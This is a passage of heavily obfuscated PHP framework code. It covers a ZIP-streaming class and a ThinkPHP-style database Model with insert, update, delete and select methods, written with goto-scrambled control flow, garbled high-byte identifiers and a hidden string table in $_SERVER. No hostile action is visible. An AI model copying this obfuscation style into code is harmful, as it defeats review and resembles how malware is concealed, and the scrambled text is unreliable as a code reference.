array($cÍâÆÒğÔ·[2027], 4294967295), array($cÍâÆÒğÔ·[2027], 4294967295), array($cÍâÆÒğÔ·[2028], strlen($b £´—éÏÙ)), array($cÍâÆÒğÔ·[2028], 32), array($cÍâÆÒğÔ·[2028], strlen($d†Êæ¬Î«ª)), array($cÍâÆÒğÔ·[2028], 0), array($cÍâÆÒğÔ·[2028], 0), array($cÍâÆÒğÔ·[2027], 32), array($cÍâÆÒğÔ·[2027], 4294967295)); $DÀ‹­ñ‰â‰ = array(array($cÍâÆÒğÔ·[2028], 1), array($cÍâÆÒğÔ·[2028], 28), array($cÍâÆÒğÔ·[2029], $eƒ¬¥Õ•šõ), array($cÍâÆÒğÔ·[2029], $DŠÃ¿ø’÷‹), array($cÍâÆÒğÔ·[2029], $eã’áÔ®ô), array($cÍâÆÒğÔ·[2027], 0)); goto B“ğÓãŸ¦±; dğë³Ùº: } protected function addCdr64Eof() { goto döƒÒ´•ÑÅ; BÎÀğ‡­ —: $this->send($aô‡„Ã¢¦ñ); goto CÂ™È¾¾÷à; E…óÃÆ¦öË: $AÏ¶å­à†… = $this->ofs; $fÑ–°ğ¨Õ = array(array($E‰Çàğ¤Óƒ[2027], static::ZIP64_CDR_EOF_SIGNATURE), array($E‰Çàğ¤Óƒ[2029], 44), array($E‰Çàğ¤Óƒ[2028], static::ZIP_VERSION_64), array($E‰Çàğ¤Óƒ[2028], static::ZIP_VERSION_64), array($E‰Çàğ¤Óƒ[2027], 0), array($E‰Çàğ¤Óƒ[2027], 0), array($E‰Çàğ¤Óƒ[2029], $d›°ÉŸ¹¶»), array($E‰Çàğ¤Óƒ[2029], $d›°ÉŸ¹¶»), array($E‰Çàğ¤Óƒ[2029], $Fà‘®ÒŒ›·), array($E‰Çàğ¤Óƒ[2029], $AÏ¶å­à†…)); $aô‡„Ã¢¦ñ = $this->packFields($fÑ–°ğ¨Õ); goto BÎÀğ‡­ —; döƒÒ´•ÑÅ: $E‰Çàğ¤Óƒ =& $_SERVER[…Ò×–]; $d›°ÉŸ¹¶» = count($this->files); $Fà‘®ÒŒ›· = $this->cdr_ofs; goto E…óÃÆ¦öË; CÂ™È¾¾÷à: } protected function addCdr64Locator() { goto fƒ¶…Ë†‚Œ; BîÆÜ‰À´ƒ: $FõÊ†ÉËÅ = $this->ofs; $C•Å›ƒš® = array(array($b‰ÚºàÀ‚ô[2027], static::ZIP64_CDR_LOCATOR_SIGNATURE), array($b‰ÚºàÀ‚ô[2027], 0), array($b‰ÚºàÀ‚ô[2029], $FõÊ†ÉËÅ + $e‚Ä‚¶‹ƒÓ), array($b‰ÚºàÀ‚ô[2027], 1)); $D˜¼‹©°Éå = $this->packFields($C•Å›ƒš®); goto açÚÚÓîİ¼; açÚÚÓîİ¼: $this->send($D˜¼‹©°Éå); goto Dç—‰Çµ—; fƒ¶…Ë†‚Œ: $b‰ÚºàÀ‚ô =& $_SERVER[…Ò×–]; $F…ŸÏöªò = count($this->files); $e‚Ä‚¶‹ƒÓ = $this->cdr_ofs; goto BîÆÜ‰À´ƒ; Dç—‰Çµ—: } protected function addCdrEof() { goto cÍ—á‘ÉÜ; cÍ—á‘ÉÜ: $däÚˆÚ—òé =& $_SERVER[…Ò×–]; $E‹ˆ‚Ù‰–Œ = count($this->files); $bóËŸ¨†Ÿ‚ = $this->cdr_ofs; goto e²Ä§ñ‡¶; e²Ä§ñ‡¶: $fä•©ÙçÃğ = $this->ofs; $A¶¢ºÇ¡é = $däÚˆÚ—òé[33]; $FùŞ©šô»µ = array(array($däÚˆÚ—òé[2027], static::CDR_EOF_SIGNATURE), array($däÚˆÚ—òé[2028], 0), array($däÚˆÚ—òé[2028], 0), array($däÚˆÚ—òé[2028], $E‹ˆ‚Ù‰–Œ), array($däÚˆÚ—òé[2028], $E‹ˆ‚Ù‰–Œ), array($däÚˆÚ—òé[2027], 4294967295), array($däÚˆÚ—òé[2027], 4294967295), array($däÚˆÚ—òé[2028], strlen($A¶¢ºÇ¡é))); goto D×®õ²Ú†¨; D×®õ²Ú†¨: $D‰ÁôÊ’è = $this->packFields($FùŞ©šô»µ) . $A¶¢ºÇ¡é; $this->send($D‰ÁôÊ’è); goto E•ì‚åÉ´‘; E•ì‚åÉ´‘: } protected function addCdr() { foreach ($this->files as $AŠŸÂ†˜«°) { $this->addCdrFile($AŠŸÂ†˜«°); } $this->addCdrEof(); } protected function clear() { $this->files = array(); $this->ofs = 0; $this->cdr_ofs = 0; } protected function sendHttpHeaders() { $d‘ÇÊíÆ³ =& $_SERVER[…Ò×–]; $A‘Èí…îÄŠ = $d‘ÇÊíÆ³[206]; if ($this->outputName) { $FÃô‡× …« = trim(str_replace(array($d‘ÇÊíÆ³[113], $d‘ÇÊíÆ³[55], $d‘ÇÊíÆ³[93], $d‘ÇÊíÆ³[67], $d‘ÇÊíÆ³[221], $d‘ÇÊíÆ³[999]), $d‘ÇÊíÆ³[33], $this->outputName)); $F’²Ş‘ì¹ = rawurlencode($FÃô‡× …«); $A‘Èí…îÄŠ .= "\x3b\40\146\x69\x6c\x65\156\x61\x6d\x65\52\75\165\x74\x66\55\x38\47\47{$F’²Ş‘ì¹}"; } $f‰¬íÒºôÛ = array($d‘ÇÊíÆ³[203] => $d‘ÇÊíÆ³[2030], $d‘ÇÊíÆ³[2031] => $A‘Èí…îÄŠ, $d‘ÇÊíÆ³[2032] => $d‘ÇÊíÆ³[2033], $d‘ÇÊíÆ³[2034] => $d‘ÇÊíÆ³[2035], $d‘ÇÊíÆ³[2036] => $d‘ÇÊíÆ³[2037]); foreach ($f‰¬íÒºôÛ as $aîí•†êİ => $e‚”ªÀã™ä) { header($aîí•†êİ . $d‘ÇÊíÆ³[886] . $e‚”ªÀã™ä); } } protected function send($Aàšºâˆ¯‘) { if ($this->needHeaders) { $this->sendHttpHeaders(); } $this->needHeaders = !1; fwrite($this->outputStream, $Aàšºâˆ¯‘); } protected final function dosTime($E¨¯½¢Á¯ô) { $fà¿ÜÀ“¯§ =& $_SERVER[…Ò×–]; $Cî‚Ò¾è·¹ = getdate($E¨¯½¢Á¯ô); if ($Cî‚Ò¾è·¹[$fà¿ÜÀ“¯§[1737]] < 1980) { $Cî‚Ò¾è·¹ = array($fà¿ÜÀ“¯§[1737] => 1980, $fà¿ÜÀ“¯§[2038] => 1, $fà¿ÜÀ“¯§[2039] => 1, $fà¿ÜÀ“¯§[2040] => 0, $fà¿ÜÀ“¯§[2041] => 0, $fà¿ÜÀ“¯§[2042] => 0); } $Cî‚Ò¾è·¹[$fà¿ÜÀ“¯§[1737]] -= 1980; return $Cî‚Ò¾è·¹[$fà¿ÜÀ“¯§[1737]] << 25 | $Cî‚Ò¾è·¹[$fà¿ÜÀ“¯§[2038]] << 21 | $Cî‚Ò¾è·¹[$fà¿ÜÀ“¯§[2039]] << 16 | $Cî‚Ò¾è·¹[$fà¿ÜÀ“¯§[2040]] << 11 | $Cî‚Ò¾è·¹[$fà¿ÜÀ“¯§[2041]] << 5 | $Cî‚Ò¾è·¹[$fà¿ÜÀ“¯§[2042]] >> 1; } protected function packFields($a‹àÉï±«É) { $bé •îÉøí =& $_SERVER[…Ò×–]; $EİùßÁÄß = $bé •îÉøí[33]; $cº‹¶Úå‰‚ = array(); foreach ($a‹àÉï±«É as $cˆ™µ­âñÚ) { $EİùßÁÄß .= $cˆ™µ­âñÚ[0]; $cº‹¶Úå‰‚[] = $cˆ™µ­âñÚ[1]; } array_unshift($cº‹¶Úå‰‚, $EİùßÁÄß); return call_user_func_array($bé •îÉøí[2043], $cº‹¶Úå‰‚); } protected function filterFilename($FÕÂ‰¨›Ú·) { $fÃÒƒ×òœ =& $_SERVER[…Ò×–]; return str_replace(array($fÃÒƒ×òœ[93], $fÃÒƒ×òœ[4], $fÃÒƒ×òœ[180], $fÃÒƒ×òœ[69], $fÃÒƒ×òœ[113], $fÃÒƒ×òœ[931], $fÃÒƒ×òœ[934], $fÃÒƒ×òœ[275]), $fÃÒƒ×òœ[70], $FÕÂ‰¨›Ú·); } } goto e‡ç·Šï®±; f¸Ñ–Şò”Ã: define($_SERVER[…Ò×–][234], 0); define($_SERVER[…Ò×–][235], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\141\x62\154\x65", "\x6f\x72\144\x65\x72", "\141\154\151\141\x73", "\x68\141\166\151\156\x67", "\147\162\x6f\x75\x70", "\x6c\157\x63\153", "\144\151\163\x74\x69\156\x63\x74", "\x61\x75\164\157", "\x66\151\x6c\164\145\x72", "\x76\x61\x6c\x69\x64\141\x74\x65", "\162\145\x73\165\x6c\164", "\x62\151\x6e\144", "\164\157\153\145\156"); public function __construct($b¯´ô³íãê = '', $eÊÁ™­«†Å = '', $cËõ„ìš = '') { $FÄ„ø•œ·¦ =& $_SERVER[…Ò×–]; $this->_initialize(); if (!empty($b¯´ô³íãê)) { if (strpos($b¯´ô³íãê, $FÄ„ø•œ·¦[91])) { list($this->dbName, $this->name) = explode($FÄ„ø•œ·¦[91], $b¯´ô³íãê); } else { $this->name = $b¯´ô³íãê; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($eÊÁ™­«†Å)) { $this->tablePrefix = $FÄ„ø•œ·¦[33]; } elseif ($FÄ„ø•œ·¦[33] != $eÊÁ™­«†Å) { $this->tablePrefix = $eÊÁ™­«†Å; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($FÄ„ø•œ·¦[236]); } $this->db(0, empty($this->connection) ? $cËõ„ìš : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $DÍÂÂÂÕ£Š =& $_SERVER[…Ò×–]; if (empty($this->fields)) { if (think_config($DÍÂÂÂÕ£Š[237])) { $CÀ‰®‘èÅ = $this->dbName ? $this->dbName : think_config($DÍÂÂÂÕ£Š[238]); $F¸Ñ¦ôÑå· = think_var_cache($DÍÂÂÂÕ£Š[239] . strtolower(get_path_this($CÀ‰®‘èÅ) . $DÍÂÂÂÕ£Š[91] . $this->name)); if ($F¸Ñ¦ôÑå·) { $c­´ƒ‚®±‡ = think_config($DÍÂÂÂÕ£Š[240]); if (empty($c­´ƒ‚®±‡) || $F¸Ñ¦ôÑå·[$DÍÂÂÂÕ£Š[241]] == $c­´ƒ‚®±‡) { $this->fields = $F¸Ñ¦ôÑå·; return; } } } $this->flush(); } } public function flush() { goto cƒĞ†Ä¡òè; FÍÚÅÉ¥¼: if (!$Bºİ±äÖŞ¦) { return !1; } $this->fields = array_keys($Bºİ±äÖŞ¦); $this->fields[$e•¹æ‹ĞĞµ[242]] = !1; goto F¦—óñ˜ï¤; F¦—óñ˜ï¤: foreach ($Bºİ±äÖŞ¦ as $Eª‘âåß‘ => $dÍˆöÚßÁ®) { $dçËÂ˜½æ[$Eª‘âåß‘] = $dÍˆöÚßÁ®[$e•¹æ‹ĞĞµ[29]]; if ($dÍˆöÚßÁ®[$e•¹æ‹ĞĞµ[36]]) { $this->fields[$e•¹æ‹ĞĞµ[243]] = $Eª‘âåß‘; if ($dÍˆöÚßÁ®[$e•¹æ‹ĞĞµ[39]]) { $this->fields[$e•¹æ‹ĞĞµ[242]] = !0; } } } $this->fields[$e•¹æ‹ĞĞµ[244]] = $dçËÂ˜½æ; if (think_config($e•¹æ‹ĞĞµ[240])) { $this->fields[$e•¹æ‹ĞĞµ[241]] = think_config($e•¹æ‹ĞĞµ[240]); } goto F‚­„—®×Ô; cƒĞ†Ä¡òè: $e•¹æ‹ĞĞµ =& $_SERVER[…Ò×–]; $this->db->setModel($this->name); $Bºİ±äÖŞ¦ = $this->db->getFields($this->getTableName()); goto FÍÚÅÉ¥¼; F‚­„—®×Ô: if (think_config($e•¹æ‹ĞĞµ[237])) { $fãÜÜ×‰Î¾ = $this->dbName ? $this->dbName : think_config($e•¹æ‹ĞĞµ[238]); think_var_cache($e•¹æ‹ĞĞµ[239] . strtolower(get_path_this($fãÜÜ×‰Î¾) . $e•¹æ‹ĞĞµ[91] . $this->name), $this->fields); } goto F¢¬è¦«â•; F¢¬è¦«â•: } public function switchModel($Cì‘ñÍº‰È, $F½¢ÚìÖÚ× = array()) { $DìŞ¼œÛƒÜ =& $_SERVER[…Ò×–]; $B©ÜêÓŸÁœ = ucwords(strtolower($Cì‘ñÍº‰È)) . $DìŞ¼œÛƒÜ[245]; if (!class_exists($B©ÜêÓŸÁœ)) { think_exception($B©ÜêÓŸÁœ . think_lang($DìŞ¼œÛƒÜ[246])); } $this->_extModel = new $B©ÜêÓŸÁœ($this->name); if (!empty($F½¢ÚìÖÚ×)) { foreach ($F½¢ÚìÖÚ× as $DŠÕ„¨Åî¾) { $this->_extModel->setProperty($DŠÕ„¨Åî¾, $this->{$DŠÕ„¨Åî¾}); } } return $this->_extModel; } public function __set($c‚º’÷Éª—, $dì’«øÛ÷) { $this->data[$c‚º’÷Éª—] = $dì’«øÛ÷; } public function __get($EïğÏÁÃ˜) { return isset($this->data[$EïğÏÁÃ˜]) ? $this->data[$EïğÏÁÃ˜] : null; } public function __isset($e’·›ÔŒ”) { return isset($this->data[$e’·›ÔŒ”]); } public function __unset($DåÏÇÚ…‰) { unset($this->data[$DåÏÇÚ…‰]); } public function __call($aË‡ƒ„Øò, $FÜ”øó‘Œ) { $eÀåÁ¢È®– =& $_SERVER[…Ò×–]; if (in_array(strtolower($aË‡ƒ„Øò), $this->methods, !0)) { $this->options[strtolower($aË‡ƒ„Øò)] = $FÜ”øó‘Œ[0]; return $this; } elseif (in_array(strtolower($aË‡ƒ„Øò), array($eÀåÁ¢È®–[247], $eÀåÁ¢È®–[248], $eÀåÁ¢È®–[249], $eÀåÁ¢È®–[250], $eÀåÁ¢È®–[251]), !0)) { $bãİµ¹éÚ˜ = isset($FÜ”øó‘Œ[0]) ? $FÜ”øó‘Œ[0] : $eÀåÁ¢È®–[180]; $bãİµ¹éÚ˜ = $this->db->parseKey($bãİµ¹éÚ˜); return $this->getField(strtoupper($aË‡ƒ„Øò) . $eÀåÁ¢È®–[252] . $bãİµ¹éÚ˜ . $eÀåÁ¢È®–[253] . $aË‡ƒ„Øò, $eÀåÁ¢È®–[247]); } elseif (strtolower(substr($aË‡ƒ„Øò, 0, 5)) == $eÀåÁ¢È®–[254]) { $bãİµ¹éÚ˜ = think_parse_name(substr($aË‡ƒ„Øò, 5)); $F“½¼É¬óŸ[$bãİµ¹éÚ˜] = $FÜ”øó‘Œ[0]; return $this->where($F“½¼É¬óŸ)->find(); } elseif (strtolower(substr($aË‡ƒ„Øò, 0, 10)) == $eÀåÁ¢È®–[255]) { $Bï‚Î¨õãô = think_parse_name(substr($aË‡ƒ„Øò, 10)); $F“½¼É¬óŸ[$Bï‚Î¨õãô] = $FÜ”øó‘Œ[0]; return $this->where($F“½¼É¬óŸ)->getField($FÜ”øó‘Œ[1]); } elseif (isset($this->_scope[$aË‡ƒ„Øò])) { return $this->scope($aË‡ƒ„Øò, $FÜ”øó‘Œ[0]); } elseif (method_exists($this, $aË‡ƒ„Øò)) { array_unshift($FÜ”øó‘Œ, $aË‡ƒ„Øò); return call_user_func_array(array($this, $eÀåÁ¢È®–[256]), $FÜ”øó‘Œ); } else { return call_user_func_array(array(parent, $aË‡ƒ„Øò), $FÜ”øó‘Œ); } } protected function call() { goto eäõ–Ç¦†; D½Í¤‚Ìòô: $Aº‰¸ò‚§ = call_user_func_array(array($this, $aÚÌ¿ÓŒª), $a•³îÉ‡®); if (method_exists($this, $C°ÊëÓ‚Õ[260])) { $a¥èµ¦ƒÍš = call_user_func_array(array($this, $C°ÊëÓ‚Õ[261]), array($aä¸»Ÿš†œ, $a•³îÉ‡®, $Aº‰¸ò‚§)); if ($a¥èµ¦ƒÍš) { return $a¥èµ¦ƒÍš; } } return $Aº‰¸ò‚§; goto FÏŸºÙï›; DƒÄ‹°©êÎ: $aä¸»Ÿš†œ = $aÚÌ¿ÓŒª; if (is_array($aÚÌ¿ÓŒª)) { $aä¸»Ÿš†œ = $aÚÌ¿ÓŒª[1]; $aÚÌ¿ÓŒª = $aÚÌ¿ÓŒª[0]; } $a¢¶ïõó“â = count($a•³îÉ‡®) - 1; goto DÇ«Ú…Ã…³; DÇ«Ú…Ã…³: if (isset($a•³îÉ‡®[$a¢¶ïõó“â]) && $a•³îÉ‡®[$a¢¶ïõó“â] === $aÚÌ¿ÓŒª) { think_exception(__CLASS__ . $C°ÊëÓ‚Õ[4] . $aÚÌ¿ÓŒª . think_lang($C°ÊëÓ‚Õ[257])); return; } $a•³îÉ‡®[] = $aÚÌ¿ÓŒª; if (method_exists($this, $C°ÊëÓ‚Õ[258])) { $a¥èµ¦ƒÍš = call_user_func_array(array($this, $C°ÊëÓ‚Õ[259]), array($aä¸»Ÿš†œ, $a•³îÉ‡®)); if (!is_null($a¥èµ¦ƒÍš) && $a¥èµ¦ƒÍš !== !1) { return $a¥èµ¦ƒÍš; } } goto D½Í¤‚Ìòô; eäõ–Ç¦†: $C°ÊëÓ‚Õ =& $_SERVER[…Ò×–]; $a•³îÉ‡® = func_get_args(); $aÚÌ¿ÓŒª = array_shift($a•³îÉ‡®); goto DƒÄ‹°©êÎ; FÏŸºÙï›: } protected function _initialize() { } protected function _facade($Aù‘Ï‡¶Àº) { $aÑ™éŞËğÌ =& $_SERVER[…Ò×–]; if (!empty($this->fields)) { foreach ($Aù‘Ï‡¶Àº as $F„í­Ü‚ÚŒ => $d… Æ©÷‚›) { if (!in_array($F„í­Ü‚ÚŒ, $this->fields, !0)) { unset($Aù‘Ï‡¶Àº[$F„í­Ü‚ÚŒ]); } elseif (is_scalar($d… Æ©÷‚›)) { $this->_parseType($Aù‘Ï‡¶Àº, $F„í­Ü‚ÚŒ); } } } if (!empty($this->options[$aÑ™éŞËğÌ[262]])) { $Aù‘Ï‡¶Àº = array_map($this->options[$aÑ™éŞËğÌ[262]], $Aù‘Ï‡¶Àº); unset($this->options[$aÑ™éŞËğÌ[262]]); } $this->_beforeWrite($Aù‘Ï‡¶Àº); return $Aù‘Ï‡¶Àº; } protected function _beforeWrite(&$CºŠŠê’˜) { } public function add($aÔøËëáã = '', $b¬”ë¡Æ½ƒ = array(), $Dà¯ê…Ñ®‰ = false) { goto b‡Ã‚êÎÍô; b‡Ã‚êÎÍô: if (empty($aÔøËëáã)) { if (!empty($this->data)) { $aÔøËëáã = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[…Ò×–][263]); return !1; } } $b¬”ë¡Æ½ƒ = $this->_parseOptions($b¬”ë¡Æ½ƒ); $aÔøËëáã = $this->_facade($aÔøËëáã); goto AÈ Ö„º; AÈ Ö„º: if (!1 === $this->_beforeInsert($aÔøËëáã, $b¬”ë¡Æ½ƒ)) { return !1; } $e—ÉŞ‰Î½ = $this->db->insert($aÔøËëáã, $b¬”ë¡Æ½ƒ, $Dà¯ê…Ñ®‰); if (!1 !== $e—ÉŞ‰Î½) { $A×–Ô’ã‚ = $this->getLastInsID(); if ($A×–Ô’ã‚) { $aÔøËëáã[$this->getPk()] = $A×–Ô’ã‚; $this->_after_insert($aÔøËëáã, $b¬”ë¡Æ½ƒ); return $A×–Ô’ã‚; } $this->_after_insert($aÔøËëáã, $b¬”ë¡Æ½ƒ); } goto Aõ²İã‰; Aõ²İã‰: return $e—ÉŞ‰Î½; goto b‰ƒ£å¾¢Ğ; b‰ƒ£å¾¢Ğ: } protected function _beforeInsert(&$dÕª‡àÌ­, $A‡Ëï÷è–) { } protected function _after_insert($fÇ’™ÂŞ‰Ş, $E–¡·ìˆ¿Ÿ) { } public function addAll($DØ„ßù”Ğ‘, $CÍ«–Ì•‡§ = array(), $FîëØ½¬Ä = false) { goto bÕõîŞ³Ä; d‡§‘ÕšŒÇ: return $fÎÍœ÷¿¶; goto bÜ×“”å; d¥½ª¥óÓî: foreach ($DØ„ßù”Ğ‘ as $Aµ÷â·©Ğ¤ => $AÂÂë‚ˆæğ) { $DØ„ßù”Ğ‘[$Aµ÷â·©Ğ¤] = $this->_facade($AÂÂë‚ˆæğ); } if (method_exists($this->db, $b™¦…Ö‚¬ñ[264])) { $fÎÍœ÷¿¶ = $this->db->insertAll($DØ„ßù”Ğ‘, $CÍ«–Ì•‡§, $FîëØ½¬Ä); } else { $this->startTrans(); foreach ($DØ„ßù”Ğ‘ as $Aµ÷â·©Ğ¤ => $AÂÂë‚ˆæğ) { $fÎÍœ÷¿¶ = $this->db->insert($AÂÂë‚ˆæğ, $CÍ«–Ì•‡§, $FîëØ½¬Ä); } $this->commit(); } if (!1 !== $fÎÍœ÷¿¶) { $dèğ•±ÄóÓ = $this->getLastInsID(); if ($dèğ•±ÄóÓ) { return $dèğ•±ÄóÓ; } } goto d‡§‘ÕšŒÇ; bÕõîŞ³Ä: $b™¦…Ö‚¬ñ =& $_SERVER[…Ò×–]; if (empty($DØ„ßù”Ğ‘)) { $this->error = think_lang($b™¦…Ö‚¬ñ[263]); return !1; } $CÍ«–Ì•‡§ = $this->_parseOptions($CÍ«–Ì•‡§); goto d¥½ª¥óÓî; bÜ×“”å: } public function selectAdd($e¼Éˆ¦ïù = '', $a¦ ºèİÜ¤ = '', $Dôë‚¦î“ = array()) { $fÁõŒç‚ =& $_SERVER[…Ò×–]; $Dôë‚¦î“ = $this->_parseOptions($Dôë‚¦î“); if (!1 === ($Bè¾Ş“»¶Ø = $this->db->selectInsert($e¼Éˆ¦ïù ? $e¼Éˆ¦ïù : $Dôë‚¦î“[$fÁõŒç‚[265]], $a¦ ºèİÜ¤ ? $a¦ ºèİÜ¤ : $this->getTableName(), $Dôë‚¦î“))) { $this->error = think_lang($fÁõŒç‚[266]); return !1; } else { return $Bè¾Ş“»¶Ø; } } public function save($BØö¿›¹Éß = '', $bÊ¸¸ëíâÎ = array()) { goto cÖ‚Ô‚‡Ğ«; cÖ‚Ô‚‡Ğ«: $DÌŒ±³Í£† =& $_SERVER[…Ò×–]; if (empty($BØö¿›¹Éß)) { if (!empty($this->data)) { $BØö¿›¹Éß = $this->data; $this->data = array(); } else { $this->error = think_lang($DÌŒ±³Í£†[263]); return !1; } } $BØö¿›¹Éß = $this->_facade($BØö¿›¹Éß); goto b•£Åªø; b•£Åªø: $bÊ¸¸ëíâÎ = $this->_parseOptions($bÊ¸¸ëíâÎ); $E¾‘…ÒˆñÉ = $this->getPk(); if (!isset($bÊ¸¸ëíâÎ[$DÌŒ±³Í£†[267]])) { if (isset($BØö¿›¹Éß[$E¾‘…ÒˆñÉ])) { $Dç”²ÎÈ¤[$E¾‘…ÒˆñÉ] = $BØö¿›¹Éß[$E¾‘…ÒˆñÉ]; $bÊ¸¸ëíâÎ[$DÌŒ±³Í£†[267]] = $Dç”²ÎÈ¤; unset($BØö¿›¹Éß[$E¾‘…ÒˆñÉ]); } else { $this->error = think_lang($DÌŒ±³Í£†[266]); return !1; } } goto e¨•š©ä¦ö; C­ŠÕ†ÅÈŒ: if (!1 !== $d¸õ…‰¯°) { if (isset($CƒÓé¼¦È©)) { $BØö¿›¹Éß[$E¾‘…ÒˆñÉ] = $CƒÓé¼¦È©; } $this->_afterUpdate($BØö¿›¹Éß, $bÊ¸¸ëíâÎ); } return $d¸õ…‰¯°; goto FÜ¥ßÜˆäÓ; e¨•š©ä¦ö: if (is_array($bÊ¸¸ëíâÎ[$DÌŒ±³Í£†[267]]) && isset($bÊ¸¸ëíâÎ[$DÌŒ±³Í£†[267]][$E¾‘…ÒˆñÉ])) { $CƒÓé¼¦È© = $bÊ¸¸ëíâÎ[$DÌŒ±³Í£†[267]][$E¾‘…ÒˆñÉ]; } if (!1 === $this->_beforeUpdate($BØö¿›¹Éß, $bÊ¸¸ëíâÎ)) { return !1; } $d¸õ…‰¯° = $this->db->update($BØö¿›¹Éß, $bÊ¸¸ëíâÎ); goto C­ŠÕ†ÅÈŒ; FÜ¥ßÜˆäÓ: } protected function _beforeUpdate(&$Aí“óÄ‘ä, $DÎ»¹¹ØŞ) { } protected function _afterUpdate($BŸêÇà”Ë, $c–‡êäÉÃ¥) { } public function delete($A¡¶óŸ… Û = array()) { goto a§­¶…‘áÕ; dŸ“Ù×¦“í: if (is_numeric($A¡¶óŸ… Û) || is_string($A¡¶óŸ… Û)) { if (strpos($A¡¶óŸ… Û, $c‚¡Â‡à¡[47])) { $b“¶öÀ÷à”[$díì¹Ç¿] = array($c‚¡Â‡à¡[268], $A¡¶óŸ… Û); } else { $b“¶öÀ÷à”[$díì¹Ç¿] = $A¡¶óŸ… Û; } $this->options[$c‚¡Â‡à¡[267]] = $b“¶öÀ÷à”; } $A¡¶óŸ… Û = $this->_parseOptions(); if (is_array($A¡¶óŸ… Û[$c‚¡Â‡à¡[267]]) && isset($A¡¶óŸ… Û[$c‚¡Â‡à¡[267]][$díì¹Ç¿])) { $FÚ†è›íÆ = $A¡¶óŸ… Û[$c‚¡Â‡à¡[267]][$díì¹Ç¿]; } goto Eƒ…×·°†; Eƒ…×·°†: $cÏ†ö‡ñì• = $this->db->delete($A¡¶óŸ… Û); if (!1 !== $cÏ†ö‡ñì•) { $D˜ÚÔ¥»á = array(); if (isset($FÚ†è›íÆ)) { $D˜ÚÔ¥»á[$díì¹Ç¿] = $FÚ†è›íÆ; } $this->_after_delete($D˜ÚÔ¥»á, $A¡¶óŸ… Û); } return $cÏ†ö‡ñì•; goto C’ØÓÓ‘Ÿß; a§­¶…‘áÕ: $c‚¡Â‡à¡ =& $_SERVER[…Ò×–]; if (empty($A¡¶óŸ… Û) && empty($this->options[$c‚¡Â‡à¡[267]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $díì¹Ç¿ = $this->getPk(); goto dŸ“Ù×¦“í; C’ØÓÓ‘Ÿß: } protected function _after_delete($EæßâÎ‚‘É, $FÂİÄÏ«¥) { } public function select($EôÌ²¾Ó¢ä = array()) { goto Aø¸‹¿Ä•º; eÜàøÛ‘¶å: $this->_afterSelect($Aƒ¨Áëôì, $EôÌ²¾Ó¢ä); return $Aƒ¨Áëôì; goto DÆ”‘¤’ªµ; aŠËœÑ³æ½: $Aƒ¨Áëôì = $this->db->select($EôÌ²¾Ó¢ä); if (!1 === $Aƒ¨Áëôì) { return !1; } if (empty($Aƒ¨Áëôì)) { return null; } goto eÜàøÛ‘¶å; Aø¸‹¿Ä•º: $fƒàÊ¥÷‘© =& $_SERVER[…Ò×–]; if (is_string($EôÌ²¾Ó¢ä) || is_numeric($EôÌ²¾Ó¢ä)) { $CÆİòÃÑˆ = $this->getPk(); if (strpos($EôÌ²¾Ó¢ä, $fƒàÊ¥÷‘©[47])) { $fîó¨Øß¥¹[$CÆİòÃÑˆ] = array($fƒàÊ¥÷‘©[268], $EôÌ²¾Ó¢ä); } else { $fîó¨Øß¥¹[$CÆİòÃÑˆ] = $EôÌ²¾Ó¢ä; } $this->options[$fƒàÊ¥÷‘©[267]] = $fîó¨Øß¥¹; } elseif (!1 === $EôÌ²¾Ó¢ä) { $EôÌ²¾Ó¢ä = $this->_parseOptions(); return $fƒàÊ¥÷‘©[269] . $this->db->buildSelectSql($EôÌ²¾Ó¢ä) . $fƒàÊ¥÷‘©[270]; } $EôÌ²¾Ó¢ä = $this->_parseOptions(); goto aŠËœÑ³æ½; DÆ”‘¤’ªµ: } protected function _afterSelect(&$aƒŠÆ¯åè´, $C¤óå°) { } public function buildSql($Dìó¯¼•à = array()) { $AŠŠã³‰‰¹ =& $_SERVER[…Ò×–]; $Dìó¯¼•à = $this->_parseOptions($Dìó¯¼•à); return $AŠŠã³‰‰¹[269] . $this->db->buildSelectSql($Dìó¯¼•à) . $AŠŠã³‰‰¹[270]; } public function optionsValue($Dô“ ŠĞ™İ = null) { if (is_null($Dô“ ŠĞ™İ)) { return $this->options; } elseif (is_array($Dô“ ŠĞ™İ)) { $this->options = array_merge($this->options, $Dô“ ŠĞ™İ); } } protected function _parseOptions($b¼†Õñß¤ß = array()) { goto dõáâ‘ìÍ»; bÏöÎ°ì: if (!isset($b¼†Õñß¤ß[$fÖè‚£ÌÂ[271]])) { $b¼†Õñß¤ß[$fÖè‚£ÌÂ[271]] = $this->getTableName(); $b‚ôÒ…›¦ = $this->fields; } else { $b‚ôÒ…›¦ = $this->getDbFields(); } if (!empty($b¼†Õñß¤ß[$fÖè‚£ÌÂ[272]])) { $b¼†Õñß¤ß[$fÖè‚£ÌÂ[271]] .= $fÖè‚£ÌÂ[50] . $b¼†Õñß¤ß[$fÖè‚£ÌÂ[272]]; } $b¼†Õñß¤ß[$fÖè‚£ÌÂ[273]] = $this->name; goto AáˆÛí·™·; AáˆÛí·™·: if (isset($b¼†Õñß¤ß[$fÖè‚£ÌÂ[267]]) && is_array($b¼†Õñß¤ß[$fÖè‚£ÌÂ[267]]) && !empty($b‚ôÒ…›¦) && !isset($b¼†Õñß¤ß[$fÖè‚£ÌÂ[274]]) && !isset($b¼†Õñß¤ß[$fÖè‚£ÌÂ[271]])) { foreach ($b¼†Õñß¤ß[$fÖè‚£ÌÂ[267]] as $C´ìàÕÙ“á => $eø‡³ÙŠâª) { $C´ìàÕÙ“á = trim($C´ìàÕÙ“á); if (in_array($C´ìàÕÙ“á, $b‚ôÒ…›¦, !0)) { if (is_scalar($eø‡³ÙŠâª)) { $this->_parseType($b¼†Õñß¤ß[$fÖè‚£ÌÂ[267]], $C´ìàÕÙ“á); } } elseif (!is_numeric($C´ìàÕÙ“á) && 